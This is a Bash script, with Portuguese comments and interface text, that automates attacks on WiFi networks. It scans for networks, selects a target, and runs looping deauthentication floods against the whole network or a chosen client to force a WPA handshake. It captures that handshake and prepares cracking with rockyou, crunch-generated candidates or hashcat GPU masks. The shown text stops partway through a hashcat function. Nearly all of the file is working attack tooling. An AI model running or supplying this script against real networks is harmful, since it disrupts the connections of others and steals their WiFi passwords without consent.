#!/bin/bash

# WiFi Brute Force - Handshake Capture & Password Cracking
# Criador: JayZoneSec

# Cores
RED='\033[0;31m'
RED_BOLD='\033[1;91m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Cores para o header (com negrito)
HEADER_COLORS=(
    "\033[1;36m"  # Ciano
    "\033[1;31m"  # Vermelho
    "\033[1;32m"  # Verde
    "\033[1;33m"  # Amarelo
)

# Variáveis
INTERFACE=""
MONITOR_INTERFACE=""
TARGET_BSSID=""
TARGET_SSID=""
TARGET_CHANNEL=""
CLIENT_MAC=""
DEAUTH_MODE=""
HANDSHAKE_FILE=""
WORDLIST_FILE=""
CRACK_MODE=""
CRUNCH_MIN_LEN=""
CRUNCH_MAX_LEN=""
CRUNCH_CHARSET=""

# GPU/hashcat
HASHCAT_AVAILABLE=0
HASHCAT_MODE=""

# Processos
AIRODUMP_PID=""
DEAUTH_PID=""
CRACK_PID=""

# Arquivos
PASSWORD_FILE="senhas_capturadas.txt"

# Flags
CLEANUP_DONE=0
QUIET_CLEANUP=0

# ------------------------------------------------------------
# HEADER E STATUS
# ------------------------------------------------------------
show_header() {
    clear
    # Escolhe uma cor aleatória do array
    local rand_idx=$((RANDOM % ${#HEADER_COLORS[@]}))
    local chosen_color="${HEADER_COLORS[$rand_idx]}"
    local current_datetime=$(date '+%d/%m/%Y %H:%M:%S')
    
    echo -e "${chosen_color}"
    echo "╔════════════════════════════════════════════╗"
    echo "║        ***** BRUTE FORCE WIFI *****        ║"
    echo "║              V-1.0 JayZoneSec              ║"
    echo "║            ${current_datetime}             ║"
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
}

show_status() {
    echo -e "${CYAN}=== STATUS ===${NC}"
    [[ -n "$MONITOR_INTERFACE" ]] && echo -e "Monitor: ${RED}$MONITOR_INTERFACE${NC}"
    [[ -n "$TARGET_SSID" ]] && echo -e "Alvo: ${GREEN}$TARGET_SSID${NC}"
    [[ -n "$TARGET_BSSID" ]] && echo -e "BSSID: ${GREEN}$TARGET_BSSID${NC}"
    [[ -n "$TARGET_CHANNEL" ]] && echo -e "Canal: ${GREEN}$TARGET_CHANNEL${NC}"
    [[ -n "$CLIENT_MAC" ]] && echo -e "Cliente: ${PURPLE}$CLIENT_MAC${NC}"
    [[ -n "$HANDSHAKE_FILE" ]] && echo -e "Handshake: ${YELLOW}$HANDSHAKE_FILE${NC}"
    [[ -n "$WORDLIST_FILE" ]] && echo -e "Wordlist: ${YELLOW}$WORDLIST_FILE${NC}"
    [[ -n "$CRUNCH_MIN_LEN" ]] && echo -e "Crunch Pipe: ${YELLOW}$CRUNCH_MIN_LEN-$CRUNCH_MAX_LEN ($CRUNCH_CHARSET)${NC}"
    echo
}

clear_attack_status() {
    TARGET_SSID=""
    TARGET_BSSID=""
    TARGET_CHANNEL=""
    CLIENT_MAC=""
    HANDSHAKE_FILE=""
    WORDLIST_FILE=""
    CRACK_MODE=""
    CRUNCH_MIN_LEN=""
    CRUNCH_MAX_LEN=""
    CRUNCH_CHARSET=""
}

# ------------------------------------------------------------
# DEPENDÊNCIAS E LIMPEZA
# ------------------------------------------------------------
check_dependencies() {
    echo -e "${CYAN}[*] Verificando dependências...${NC}"
    local deps=("aircrack-ng" "xterm" "crunch")
    local missing=()
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${RED}[ERRO] Dependências faltando: ${missing[*]}${NC}"
        echo -e "${YELLOW}Instale com: sudo apt install ${missing[*]}${NC}"
        return 1
    fi
    echo -e "${GREEN}[+] Todas dependências verificadas${NC}"
    return 0
}

check_hashcat() {
    if ! command -v hashcat &>/dev/null; then
        return 1
    fi
    if hashcat -I 2>/dev/null | grep -q "Device.*Type.*GPU"; then
        HASHCAT_AVAILABLE=1
        return 0
    fi
    return 1
}

cleanup() {
    if [[ $CLEANUP_DONE -eq 1 ]]; then
        return
    fi
    CLEANUP_DONE=1

    if [[ $QUIET_CLEANUP -eq 0 ]]; then
        echo -e "\n${CYAN}[*] Executando limpeza final...${NC}"
    fi

    sudo pkill -f "airodump-ng" 2>/dev/null
    sudo pkill -f "aireplay-ng" 2>/dev/null
    sudo pkill -f "xterm.*Handshake" 2>/dev/null
    sudo pkill -f "xterm.*Deauth" 2>/dev/null
    sudo pkill -f "xterm.*Quebra" 2>/dev/null
    sudo pkill -f "xterm.*Captura" 2>/dev/null
    sudo pkill -f "crunch" 2>/dev/null
    sudo pkill -f "hashcat" 2>/dev/null

    sleep 2

    [[ -n "$AIRODUMP_PID" ]] && kill "$AIRODUMP_PID" 2>/dev/null
    [[ -n "$DEAUTH_PID" ]] && kill "$DEAUTH_PID" 2>/dev/null
    [[ -n "$CRACK_PID" ]] && kill "$CRACK_PID" 2>/dev/null

    if [[ -n "$MONITOR_INTERFACE" ]]; then
        sudo airmon-ng stop "$MONITOR_INTERFACE" > /dev/null 2>&1
    fi

    sudo service NetworkManager start > /dev/null 2>&1
    sudo systemctl start NetworkManager > /dev/null 2>&1

    if [[ $QUIET_CLEANUP -eq 0 ]]; then
        echo -e "${GREEN}[+] Limpeza concluída${NC}"
    fi
}

do_exit() {
    clear
    show_header
    echo -e "${CYAN}Até logo! 👋${NC}"
    echo -e "${CYAN}[*] Executando limpeza final...${NC}"
    sleep 1

    QUIET_CLEANUP=1
    cleanup

    echo -e "${GREEN}[+] Limpeza concluída${NC}"
    sleep 1
    clear
    exit 0
}

# ------------------------------------------------------------
# CONFIGURAR INTERFACE
# ------------------------------------------------------------
setup_interface() {
    clear
    show_header
    echo -e "${CYAN}[*] Configurando interface...${NC}"

    sudo pkill -f "airodump-ng" 2>/dev/null
    sudo pkill -f "aireplay-ng" 2>/dev/null

    if [[ -n "$MONITOR_INTERFACE" ]]; then
        sudo airmon-ng stop "$MONITOR_INTERFACE" > /dev/null 2>&1
        MONITOR_INTERFACE=""
    fi

    # Listar apenas interfaces físicas (exclui mon)
    local raw_interfaces=($(iw dev 2>/dev/null | grep Interface | awk '{print $2}'))
    local interfaces=()
    for iface in "${raw_interfaces[@]}"; do
        if [[ ! "$iface" =~ mon$ ]]; then
            interfaces+=("$iface")
        fi
    done

    if [[ ${#interfaces[@]} -eq 0 ]]; then
        echo -e "${RED}[ERRO] Nenhuma interface wireless encontrada${NC}"
        return 1
    fi

    echo -e "${GREEN}Interfaces disponíveis:${NC}"
    for i in "${!interfaces[@]}"; do
        echo -e "  ${GREEN}$((i+1)))${NC} ${interfaces[i]}"
    done
    read -p "Selecione: " choice_interface

    if [[ ! "$choice_interface" =~ ^[0-9]+$ ]] || [[ $choice_interface -lt 1 ]] || [[ $choice_interface -gt ${#interfaces[@]} ]]; then
        echo -e "${RED}[ERRO] Seleção inválida${NC}"
        return 1
    fi

    INTERFACE="${interfaces[$((choice_interface-1))]}"

    echo -e "${CYAN}[*] Ativando modo monitor em $INTERFACE...${NC}"
    sudo airmon-ng check kill > /dev/null 2>&1
    if sudo airmon-ng start "$INTERFACE" > /dev/null 2>&1; then
        MONITOR_INTERFACE="${INTERFACE}mon"
        echo -e "${GREEN}[+] Modo monitor ativado: $MONITOR_INTERFACE${NC}"
        sleep 2
        return 0
    else
        echo -e "${RED}[ERRO] Falha ao ativar modo monitor${NC}"
        return 1
    fi
}

# ------------------------------------------------------------
# SCAN DE REDES
# ------------------------------------------------------------
scan_networks() {
    clear
    show_header
    show_status
    echo -e "${CYAN}[*] Iniciando scan de redes...${NC}"
    echo -e "${YELLOW}[!] Use a interface $MONITOR_INTERFACE para scan${NC}"
    echo -e "${YELLOW}[!] Pressione Ctrl+C no terminal do scan quando terminar${NC}"

    rm -f /tmp/scan_networks* /tmp/scanned_networks.txt

    xterm -bg black -fg white -geometry 100x30 -T "Scan Redes" -e \
        "airodump-ng $MONITOR_INTERFACE" &
    AIRODUMP_PID=$!

    wait "$AIRODUMP_PID" 2>/dev/null
    AIRODUMP_PID=""

    collect_scan_results
}

collect_scan_results() {
    echo -e "${CYAN}[*] Coletando resultados do scan...${NC}"
    timeout 10s sudo airodump-ng -w /tmp/scan_networks --output-format csv "$MONITOR_INTERFACE" > /dev/null 2>&1

    if [[ ! -f "/tmp/scan_networks-01.csv" ]]; then
        echo -e "${RED}[ERRO] Nenhuma rede encontrada${NC}"
        return 1
    fi
    echo -e "${GREEN}[+] Scan concluído! Processando redes...${NC}"
    return 0
}

show_networks() {
    clear
    show_header
    show_status

    if [[ ! -f "/tmp/scan_networks-01.csv" ]]; then
        echo -e "${RED}[ERRO] Execute o scan primeiro${NC}"
        return 1
    fi

    echo -e "${CYAN}=== REDES ENCONTRADAS ===${NC}"
    echo
    printf "${YELLOW}%-3s | %-28s | %-17s | %-6s | %-6s | %-10s | %-8s${NC}\n" "Nº" "SSID" "BSSID" "Canal" "PWR" "Beacons" "ENC"
    echo "----------------------------------------------------------------------------------------------------------------------"

    rm -f /tmp/scanned_networks.txt
    local i=1

    while IFS= read -r line; do
        if [[ "$line" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2} ]]; then
            bssid=$(echo "$line" | cut -d',' -f1)
            channel=$(echo "$line" | cut -d',' -f4 | tr -d ' ')
            encryption=$(echo "$line" | cut -d',' -f6 | tr -d ' ')
            power=$(echo "$line" | cut -d',' -f9 | tr -d ' ')
            beacons=$(echo "$line" | cut -d',' -f10 | tr -d ' ')
            ssid=$(echo "$line" | cut -d',' -f14 | sed 's/^"//;s/"$//' | sed 's/^ *//;s/ *$//')

            if [[ -n "$ssid" && "$ssid" != "ESSID" ]]; then
                if [[ ${#ssid} -gt 28 ]]; then
                    ssid="${ssid:0:25}..."
                fi
                printf "${GREEN}%-3d${NC} | ${CYAN}%-28s${NC} | ${YELLOW}%-17s${NC} | ${BLUE}%-6s${NC} | ${RED}%-6s${NC} | ${PURPLE}%-10s${NC} | ${GREEN}%-8s${NC}\n" \
                    "$i" "$ssid" "$bssid" "$channel" "$power" "$beacons" "$encryption"
                echo "$i,$bssid,$ssid,$channel,$power,$beacons,$encryption" >> /tmp/scanned_networks.txt
                ((i++))
            fi
        fi
    done < "/tmp/scan_networks-01.csv"

    echo
    echo -e "${GREEN}Total: $((i-1)) redes encontradas${NC}"
    echo
    return 0
}

# ------------------------------------------------------------
# SELEÇÃO DE ALVO
# ------------------------------------------------------------
select_target() {
    if [[ ! -f "/tmp/scanned_networks.txt" ]]; then
        echo -e "${RED}[ERRO] Nenhuma rede disponível${NC}"
        return 1
    fi

    read -p "Digite o número da rede alvo: " target_num

    if ! grep -q "^$target_num," "/tmp/scanned_networks.txt"; then
        echo -e "${RED}[ERRO] Número inválido${NC}"
        return 1
    fi

    selected_network=$(grep "^$target_num," "/tmp/scanned_networks.txt")
    TARGET_BSSID=$(echo "$selected_network" | cut -d',' -f2)
    TARGET_SSID=$(echo "$selected_network" | cut -d',' -f3)
    TARGET_CHANNEL=$(echo "$selected_network" | cut -d',' -f4 | tr -d ' ')

    clear
    show_header
    show_status
    echo -e "${GREEN}[+] Alvo selecionado com sucesso!${NC}"
    echo
    return 0
}

# ------------------------------------------------------------
# TIPO DE ATAQUE (DEAUTH)
# ------------------------------------------------------------
select_attack_type() {
    echo -e "${CYAN}=== TIPO DE DEAUTH ===${NC}"
    echo
    echo -e "${GREEN}[1]${NC} Ataque à rede inteira"
    echo -e "${GREEN}[2]${NC} Ataque a cliente específico"
    echo

    read -p "Selecione o tipo de ataque: " attack_choice

    case $attack_choice in
        1)
            DEAUTH_MODE="REDE_INTEIRA"
            CLIENT_MAC=""
            echo -e "${GREEN}[+] Modo: Ataque à rede inteira${NC}"
            start_capture_handshake
            ;;
        2)
            DEAUTH_MODE="CLIENTE_ESPECIFICO"
            scan_clients_for_attack
            ;;
        *)
            echo -e "${RED}[ERRO] Opção inválida${NC}"
            return 1
            ;;
    esac
}

# ------------------------------------------------------------
# SCAN DE CLIENTES
# ------------------------------------------------------------
scan_clients_for_attack() {
    clear
    show_header
    show_status
    echo -e "${CYAN}[*] Escaneando clientes da rede $TARGET_SSID...${NC}"

    sudo iwconfig "$MONITOR_INTERFACE" channel "$TARGET_CHANNEL" > /dev/null 2>&1
    rm -f /tmp/scan_clients* /tmp/scan_clients.txt

    echo -e "${GREEN}[+] Scan de clientes por 20 segundos...${NC}"
    xterm -bg black -fg green -geometry 100x25 -T "Scan Clientes - $TARGET_SSID" -e \
        "airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL --write /tmp/scan_clients --output-format csv $MONITOR_INTERFACE" &
    AIRODUMP_PID=$!

    sleep 20

    kill "$AIRODUMP_PID" 2>/dev/null
    AIRODUMP_PID=""
    process_clients_for_attack
}

process_clients_for_attack() {
    echo -e "${CYAN}[*] Processando clientes...${NC}"

    if [[ ! -f "/tmp/scan_clients-01.csv" ]]; then
        echo -e "${YELLOW}[!] Nenhum cliente encontrado${NC}"
        echo -e "${YELLOW}[!] Não faz sentido atacar sem clientes. Voltando ao menu principal.${NC}"
        sleep 2
        clear_attack_status
        show_initial_menu
        return
    fi

    local i=1
    rm -f /tmp/scan_clients.txt

    while IFS= read -r line; do
        if [[ "$line" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2} ]]; then
            mac=$(echo "$line" | cut -d',' -f1)
            power=$(echo "$line" | cut -d',' -f4 | tr -d ' ')
            packets=$(echo "$line" | cut -d',' -f6 | tr -d ' ')

            if [[ "$mac" != "$TARGET_BSSID" && -n "$mac" ]]; then
                echo "$i,$mac,$power,$packets" >> /tmp/scan_clients.txt
                ((i++))
            fi
        fi
    done < "/tmp/scan_clients-01.csv"

    if [[ ! -f "/tmp/scan_clients.txt" ]]; then
        echo -e "${YELLOW}[!] Nenhum cliente detectado${NC}"
        echo -e "${YELLOW}[!] Não faz sentido atacar sem clientes. Voltando ao menu principal.${NC}"
        sleep 2
        clear_attack_status
        show_initial_menu
        return
    fi

    show_clients_for_selection
}

show_clients_for_selection() {
    clear
    show_header
    show_status
    echo -e "${CYAN}=== CLIENTES CONECTADOS ===${NC}"
    echo
    echo -e "${YELLOW}Nº | MAC Address       | Sinal${NC}"
    echo "---------------------------------------------"

    while IFS=',' read -r num mac power packets; do
        printf "${GREEN}%2d${NC} | ${CYAN}%-17s${NC} | ${RED}%5s${NC}\n" "$num" "$mac" "$power"
    done < /tmp/scan_clients.txt

    echo
    echo -e "${GREEN}Total: $(wc -l < /tmp/scan_clients.txt) clientes${NC}"
    echo

    select_client_for_attack
}

select_client_for_attack() {
    read -p "Digite o número do cliente: " client_num

    if ! grep -q "^$client_num," "/tmp/scan_clients.txt"; then
        echo -e "${RED}[ERRO] Número inválido${NC}"
        DEAUTH_MODE="REDE_INTEIRA"
        CLIENT_MAC=""
    else
        selected_client=$(grep "^$client_num," "/tmp/scan_clients.txt")
        IFS=',' read -r num CLIENT_MAC power packets <<< "$selected_client"

        clear
        show_header
        show_status
        echo
        echo -e "${GREEN}✅ CLIENTE SELECIONADO:${NC}"
        echo -e "   ${CYAN}MAC:${NC} $CLIENT_MAC"
        echo
    fi

    start_capture_handshake
}

# ------------------------------------------------------------
# CAPTURA DE HANDSHAKE
# ------------------------------------------------------------
cleanup_old_handshakes() {
    [[ -z "$TARGET_SSID" ]] && return
    local old_files=($(ls -t handshakes/handshake_${TARGET_SSID}_* 2>/dev/null | tail -n +2))
    if [[ ${#old_files[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[!] Removendo handshakes antigos para: $TARGET_SSID${NC}"
        for file in "${old_files[@]}"; do
            rm -f "${file}" "${file%.*}"-* 2>/dev/null
            echo -e "${YELLOW}   - Removido: $(basename "$file")${NC}"
        done
    fi
}

start_capture_handshake() {
    clear
    show_header
    show_status
    echo -e "${CYAN}[*] Iniciando captura de handshake...${NC}"

    mkdir -p handshakes
    local timestamp=$(date +%Y%m%d_%H%M%S)
    HANDSHAKE_FILE="handshakes/handshake_${TARGET_SSID}_${timestamp}"

    echo -e "${GREEN}[+] Arquivo: $HANDSHAKE_FILE${NC}"
    echo -e "${YELLOW}[!] Iniciando captura em 3 segundos...${NC}"
    sleep 3

    sudo iwconfig "$MONITOR_INTERFACE" channel "$TARGET_CHANNEL" > /dev/null 2>&1

    # Airodump
    xterm -bg black -fg cyan -geometry 100x30 -T "Captura Handshake - $TARGET_SSID" -e \
        "airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL --write $HANDSHAKE_FILE --output-format cap $MONITOR_INTERFACE" &
    AIRODUMP_PID=$!

    sleep 2

    # Deauth
    if [[ "$DEAUTH_MODE" == "REDE_INTEIRA" ]]; then
        echo -e "${RED}[+] Deauth para rede inteira (2 pacotes a cada 3s)${NC}"
        xterm -bg black -fg red -geometry 80x15 -T "Deauth - Rede Inteira" -e \
            "while true; do sudo aireplay-ng --deauth 2 -a $TARGET_BSSID $MONITOR_INTERFACE --ignore-negative-one; sleep 3; done" &
    else
        echo -e "${RED}[+] Deauth para cliente $CLIENT_MAC (2 pacotes a cada 3s)${NC}"
        xterm -bg black -fg red -geometry 80x15 -T "Deauth - Cliente Específico" -e \
            "while true; do sudo aireplay-ng --deauth 2 -a $TARGET_BSSID -c $CLIENT_MAC $MONITOR_INTERFACE --ignore-negative-one; sleep 3; done" &
    fi
    DEAUTH_PID=$!

    echo -e "${YELLOW}[+] Aguardando handshake... (60 segundos)${NC}"

    local handshake_captured=false
    for i in {60..1}; do
        if [[ -f "${HANDSHAKE_FILE}-01.cap" ]]; then
            if aircrack-ng "${HANDSHAKE_FILE}-01.cap" 2>/dev/null | grep -q "WPA (1 handshake)"; then
                echo ""
                handshake_captured=true
                break
            fi
        fi
        echo -ne "${YELLOW}[•] Aguardando handshake... ${i} segundos restantes${NC}\\r"
        sleep 1
    done
    echo ""

    kill "$AIRODUMP_PID" 2>/dev/null
    kill "$DEAUTH_PID" 2>/dev/null
    pkill -f "airodump-ng.*$TARGET_BSSID" 2>/dev/null
    pkill -f "aireplay-ng.*$TARGET_BSSID" 2>/dev/null

    if $handshake_captured; then
        cleanup_old_handshakes
        clear
        show_header
        show_status
        echo -e "${GREEN}"
        echo "╔════════════════════════════════════════════╗"
        echo "║           ✓ HANDSHAKE CAPTURADO!           ║"
        echo "║       PRÓXIMA ETAPA: QUEBRA DE SENHA       ║"
        echo "╚════════════════════════════════════════════╝"
        echo -e "${NC}"
        echo
        select_wordlist_mode
    else
        echo -e "${RED}[-] Handshake não capturado${NC}"
        echo -e "${YELLOW}[!] Deseja tentar novamente com as mesmas configurações? (s/n)${NC}"
        read -p "> " retry_choice
        if [[ "$retry_choice" =~ ^[sS]$ ]]; then
            echo -e "${YELLOW}[!] Reiniciando captura em 3 segundos...${NC}"
            sleep 3
            start_capture_handshake
        else
            echo -e "${YELLOW}[!] Limpando status do ataque...${NC}"
            clear_attack_status
            echo -e "${YELLOW}[!] Pressione Enter para voltar ao menu...${NC}"
            read
            show_initial_menu
        fi
    fi
}

# ------------------------------------------------------------
# WORDLISTS - NOVA VERSÃO
# ------------------------------------------------------------
show_wordlist_help() {
    clear
    show_header
    show_status
    echo -e "${CYAN}=== AJUDA: TIPOS DE WORDLIST ===${NC}"
    echo
    echo -e "${GREEN}[1] Wordlist do Linux (rockyou)${NC}"
    echo -e "   ${YELLOW}➜${NC} Wordlist padrão do Kali Linux em /usr/share/wordlists/"
    echo -e "   ${YELLOW}➜${NC} Contém milhões de senhas comuns"
    echo -e "   ${YELLOW}➜${NC} Recomendado para ataques gerais"
    echo
    echo -e "${GREEN}[2] Wordlist salva pelo usuário${NC}"
    echo -e "   ${YELLOW}➜${NC} Lista wordlists em /usr/share/wordlists/wordlist_usuario/"
    echo -e "   ${YELLOW}➜${NC} Permite adicionar novas wordlists ao repositório"
    echo
    echo -e "${GREEN}[3] Gerar nova wordlist (crunch)${NC}"
    echo -e "   ${YELLOW}➜${NC} Gera wordlist baseada em padrões (ex: min 6 max 8)"
    echo -e "   ${YELLOW}➜${NC} ⚠️ CUIDADO: Pode gerar arquivos GIGANTESCOS"
    echo
    echo -e "${GREEN}[4] 🚀 Ataque direto com crunch (via pipe)${NC}"
    echo -e "   ${YELLOW}➜${NC} NÃO CRIA ARQUIVO EM DISCO"
    echo -e "   ${YELLOW}➜${NC} Perfeito para ataques com máscara"
    echo
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo
    echo -e "${YELLOW}[!] Pressione Enter para voltar ao menu...${NC}"
    read
    select_wordlist_mode
}

show_crunch_charset_help() {
    clear
    show_header
    show_status
    echo -e "${CYAN}=== AJUDA: CONJUNTOS DE CARACTERES (CRUNCH) ===${NC}"
    echo
    echo -e "${GREEN}[1] Números apenas (1234567890)${NC}"
    echo -e "   ${YELLOW}➜${NC} Ideal para senhas numéricas (ex: 12345678, 000000, etc.)"
    echo -e "   ${YELLOW}➜${NC} Combinações: 10^n (ex: 10^8 = 100.000.000)"
    echo
    echo -e "${GREEN}[2] Letras minúsculas (a-z)${NC}"
    echo -e "   ${YELLOW}➜${NC} Senhas apenas com letras minúsculas (ex: password, qwerty)"
    echo -e "   ${YELLOW}➜${NC} Combinações: 26^n"
    echo
    echo -e "${GREEN}[3] Letras maiúsculas (A-Z)${NC}"
    echo -e "   ${YELLOW}➜${NC} Senhas apenas com maiúsculas (ex: SENHA123 não se aplica)"
    echo -e "   ${YELLOW}➜${NC} Menos comum, mas possível"
    echo
    echo -e "${GREEN}[4] Alfanumérico (minúsculas + números)${NC}"
    echo -e "   ${YELLOW}➜${NC} Senhas com letras minúsculas e números (ex: senha123)"
    echo -e "   ${YELLOW}➜${NC} Combinações: 36^n (mais seguro que apenas números)"
    echo
    echo -e "${GREEN}[5] Alfanumérico + Especiais${NC}"
    echo -e "   ${YELLOW}➜${NC} Conjunto completo: letras (maiúsculas/minúsculas) + números + símbolos"
    echo -e "   ${YELLOW}➜${NC} ⚠️  MUITO MAIS COMBINAÇÕES – pode ser extremamente lento!"
    echo -e "   ${YELLOW}➜${NC} Exemplo: 72 caracteres → 72^8 = 7,2 × 10^14 combinações (impraticável)"
    echo
    echo -e "${GREEN}[6] Personalizado${NC}"
    echo -e "   ${YELLOW}➜${NC} Permite digitar exatamente os caracteres que você quer testar"
    echo -e "   ${YELLOW}➜${NC} Útil quando você sabe o padrão (ex: apenas letras minúsculas + '@')"
    echo
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo
    echo -e "${YELLOW}[!] DICA: Quanto maior o conjunto e o tamanho, mais tempo levará.${NC}"
    echo -e "${YELLOW}    Para redes WPA2, um ataque com 8 dígitos numéricos leva ~1 hora em CPU.${NC}"
    echo -e "${YELLOW}    Com caracteres especiais, o tempo pode ser de dias ou meses.${NC}"
    echo
    echo -e "${YELLOW}[!] Pressione Enter para voltar à configuração...${NC}"
    read
}

select_user_wordlist() {
    local user_dir="/usr/share/wordlists/wordlist_usuario"

    if [[ ! -d "$user_dir" ]]; then
        echo -e "${YELLOW}[!] Diretório de wordlists do usuário não encontrado.${NC}"
        echo -e "${YELLOW}[!] Deseja criá-lo agora? (s/n)${NC}"
        read -p "> " create_dir
        if [[ "$create_dir" =~ ^[sS]$ ]]; then
            sudo mkdir -p "$user_dir"
            sudo chmod 755 "$user_dir"
            echo -e "${GREEN}[+] Diretório criado em $user_dir${NC}"
        else
            echo -e "${RED}[!] Operação cancelada.${NC}"
            return 1
        fi
    fi

    local wordlists=($(ls -1 "$user_dir"/*.txt 2>/dev/null))

    if [[ ${#wordlists[@]} -eq 0 ]]; then
        echo -e "${YELLOW}[!] Nenhuma wordlist encontrada em $user_dir${NC}"
        echo -e "${YELLOW}[!] Deseja adicionar uma wordlist agora? (s/n)${NC}"
        read -p "> " add_now
        if [[ "$add_now" =~ ^[sS]$ ]]; then
            add_wordlist_to_repo
            select_user_wordlist
        else
            return 1
        fi
        return
    fi

    echo -e "${CYAN}=== WORDLISTS SALVAS PELO USUÁRIO ===${NC}"
    echo
    for i in "${!wordlists[@]}"; do
        local base=$(basename "${wordlists[$i]}")
        echo -e "${GREEN}[$((i+1))]${NC} $base"
    done
    echo
    read -p "Selecione o número da wordlist: " sel_num

    if [[ ! "$sel_num" =~ ^[0-9]+$ ]] || [[ $sel_num -lt 1 ]] || [[ $sel_num -gt ${#wordlists[@]} ]]; then
        echo -e "${RED}[ERRO] Número inválido${NC}"
        return 1
    fi

    WORDLIST_FILE="${wordlists[$((sel_num-1))]}"
    echo -e "${GREEN}[✓] Wordlist selecionada: $WORDLIST_FILE${NC}"
    CRACK_MODE="FILE"
    return 0
}

add_wordlist_to_repo() {
    local user_dir="/usr/share/wordlists/wordlist_usuario"
    mkdir -p "$user_dir" 2>/dev/null || sudo mkdir -p "$user_dir"

    echo -e "${CYAN}[*] Adicionar wordlist ao repositório do usuário${NC}"
    read -p "Caminho do arquivo de origem: " src_path

    if [[ ! -f "$src_path" ]]; then
        echo -e "${RED}[ERRO] Arquivo não encontrado${NC}"
        return 1
    fi

    read -p "Nome para salvar (ex: minha_lista.txt): " dest_name
    if [[ -z "$dest_name" ]]; then
        dest_name=$(basename "$src_path")
    fi
    if [[ ! "$dest_name" =~ \.txt$ ]]; then
        dest_name="${dest_name}.txt"
    fi

    local dest_path="$user_dir/$dest_name"
    if [[ -f "$dest_path" ]]; then
        echo -e "${YELLOW}[!] Já existe uma wordlist com este nome.${NC}"
        read -p "Sobrescrever? (s/n): " overwrite
        if [[ ! "$overwrite" =~ ^[sS]$ ]]; then
            echo -e "${RED}[!] Operação cancelada${NC}"
            return 1
        fi
    fi

    if cp "$src_path" "$dest_path" 2>/dev/null; then
        echo -e "${GREEN}[+] Wordlist adicionada: $dest_path${NC}"
    else
        sudo cp "$src_path" "$dest_path"
        sudo chmod 644 "$dest_path"
        echo -e "${GREEN}[+] Wordlist adicionada (com sudo): $dest_path${NC}"
    fi

    WORDLIST_FILE="$dest_path"
    CRACK_MODE="FILE"
    return 0
}

select_wordlist_mode() {
    clear
    show_header
    show_status
    echo -e "${CYAN}=== SELECIONE WORDLIST ===${NC}"
    echo
    echo -e "${GREEN}[1]${NC} Wordlist do Linux (rockyou)"
    echo -e "${GREEN}[2]${NC} Usar wordlist salva pelo usuário"
    echo -e "${GREEN}[3]${NC} Gerar nova wordlist (crunch)"
    echo -e "${GREEN}[4]${NC} 🚀 Ataque direto com crunch (via pipe)"
    if [[ $HASHCAT_AVAILABLE -eq 1 ]]; then
        echo -e "${GREEN}[5]${NC} ⚡ Quebra com GPU (hashcat)"
    fi
    echo -e "${GREEN}[6]${NC} 📖 Ajuda"
    echo

    read -p "Selecione: " wordlist_choice

    case $wordlist_choice in
        1)
            setup_rockyou_wordlist
            ;;
        2)
            setup_custom_wordlist
            ;;
        3)
            generate_crunch_wordlist
            ;;
        4)
            setup_crunch_pipe
            ;;
        5)
            if [[ $HASHCAT_AVAILABLE -eq 1 ]]; then
                setup_hashcat_mode
            else
                echo -e "${RED}[ERRO] GPU não disponível${NC}"
                sleep 2
                select_wordlist_mode
            fi
            ;;
        6)
            show_wordlist_help
            return
            ;;
        *)
            echo -e "${RED}[ERRO] Opção inválida${NC}"
            sleep 2
            select_wordlist_mode
            return
            ;;
    esac

    if [[ -n "$WORDLIST_FILE" && -f "$WORDLIST_FILE" ]]; then
        echo -e "${GREEN}[✓] Wordlist configurada: $WORDLIST_FILE${NC}"
        if [[ "$CRACK_MODE" == "HASHCAT" ]]; then
            ask_start_cracking_hashcat
        else
            ask_start_cracking
        fi
    elif [[ "$CRACK_MODE" == "PIPE" ]]; then
        ask_start_cracking_pipe
    else
        echo -e "${RED}[-] Wordlist não configurada${NC}"
        sleep 2
        select_wordlist_mode
    fi
}

# ------------------------------------------------------------
# CONFIGURAÇÕES ESPECÍFICAS
# ------------------------------------------------------------
setup_hashcat_mode() {
    clear
    show_header
    show_status
    echo -e "${CYAN}[*] Configurando quebra com hashcat (GPU)${NC}"
    echo -e "${GREEN}[+] Usando GPU para acelerar a quebra!${NC}"
    echo

    echo -e "${YELLOW}[!] Dispositivos disponíveis:${NC}"
    hashcat -I 2>/dev/null | grep -E "Device|Type" | sed 's/^/   /'
    echo

    echo -e "${YELLOW}[DICA] Escolha o tipo de ataque:${NC}"
    echo -e "    ${CYAN}1${NC} - Dicionário (com wordlist)"
    echo -e "    ${CYAN}2${NC} - Força bruta com máscara (ex: ?d?d?d?d?d?d?d?d)"
    echo
    read -p "Escolha (1/2): " hashcat_attack_type

    if [[ "$hashcat_attack_type" == "2" ]]; then
        read -p "Máscara (ex: ?d?d?d?d?d?d?d?d para 8 dígitos): " hashcat_mask
        CRUNCH_CHARSET="$hashcat_mask"
    else
        echo -e "${GREEN}[+] Usando wordlist selecionada: $WORDLIST_FILE${NC}"
    fi

    CRACK_MODE="HASHCAT"
    echo -e "${GREEN}[+] Modo hashcat configurado!${NC}"
}

ask_start_cracking_hashcat() {
    echo
    echo -e "${CYAN}=== CONFIGURAÇÃO CONCLUÍDA (MODO HASHCAT/GPU) ===${NC}"
    echo -e "${GREEN}Handshake:${NC} ${HANDSHAKE_FILE}-01.cap"
    echo -e "${GREEN}Wordlist:${NC} $WORDLIST_FILE"
    echo -e "${GREEN}Alvo:${NC} $TARGET_SSID ($TARGET_BSSID)"
    echo -e "${GREEN}Método:${NC} hashcat (GPU)"
    echo

    read -p "Iniciar quebra com hashcat? (s/n): " start_crack
    case $start_crack in
        s|S|y|Y)
            crack_password_hashcat
            ;;
        *)
            echo -e "${YELLOW}[!] Quebra cancelada${NC}"
            clear_attack_status
            echo -e "${YELLOW}[!] Pressione Enter para voltar ao menu...${NC}"
            read
            show_initial_menu
            ;;
    esac
